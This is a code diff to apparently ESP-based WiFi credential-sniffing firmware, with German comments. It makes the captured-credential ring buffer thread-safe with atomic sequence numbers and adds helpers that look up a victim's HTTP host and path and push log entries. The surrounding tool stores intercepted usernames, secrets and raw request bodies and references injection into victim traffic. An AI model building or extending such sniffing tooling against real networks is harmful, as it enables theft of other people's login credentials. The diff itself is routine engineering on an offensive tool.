@@ -307,6 +307,10 @@ static uint32_t fnv1a(const uint8_t* p, int len) {
 // Ring
 // ===========================================================================
 
+// MP-safe Push: claim unique seq via fetch_add, dann eigenen Slot schreiben.
+// Zwei Producer können sich keine Slots teilen, solange weniger als
+// WLAN_CRED_RING_SIZE Pushes innerhalb des Schreibe-Fensters passieren — bei
+// einem ESP_HTTP_Server-Task plus dem lwIP-tcpip-thread realistisch immer der Fall.
 static void cred_push(
     WlanCredSniff* cs,
     const char* proto,
@@ -317,7 +321,8 @@ static void cred_push(
     const char* user,
     const char* secret,
     const char* raw) {
-    uint32_t i = cs->write_seq % WLAN_CRED_RING_SIZE;
+    uint32_t my_seq = __atomic_add_fetch(&cs->write_seq, 1u, __ATOMIC_ACQ_REL);
+    uint32_t i = (my_seq - 1u) % WLAN_CRED_RING_SIZE;
     WlanCredEntry* e = &cs->ring[i];
 
     __atomic_store_n(&e->seq, 0u, __ATOMIC_RELEASE); // mid-write
@@ -334,8 +339,7 @@ static void cred_push(
     copy_cstr(e->raw_body, sizeof(e->raw_body), raw ? raw : "");
 
     __atomic_thread_fence(__ATOMIC_RELEASE);
-    cs->write_seq++;
-    __atomic_store_n(&e->seq, cs->write_seq, __ATOMIC_RELEASE);
+    __atomic_store_n(&e->seq, my_seq, __ATOMIC_RELEASE);
     __atomic_fetch_add(&cs->total, 1u, __ATOMIC_RELAXED);
 }
 
@@ -979,6 +983,18 @@ void wlan_cred_sniff_set_armed(WlanCredSniff* cs, bool armed) {
         memset(cs->url_track, 0, sizeof(cs->url_track));
     }
     __atomic_store_n(&cs->armed, armed, __ATOMIC_RELEASE);
+}
+
+bool wlan_cred_sniff_lookup_http_url(
+    WlanCredSniff* cs, uint32_t server_ip, uint16_t victim_port,
+    char* host_out, int host_sz, char* path_out, int path_sz) {
+    if(!cs) return false;
+    return url_track_lookup(cs, server_ip, victim_port, host_out, host_sz, path_out, path_sz);
+}
+
+void wlan_cred_sniff_push_log(WlanCredSniff* cs, uint32_t client_ip, const char* value) {
+    if(!cs || !value) return;
+    cred_push(cs, "LOG", client_ip, 0, 0, "", value, "", NULL);
 }
 
 void wlan_cred_sniff_push_inject(
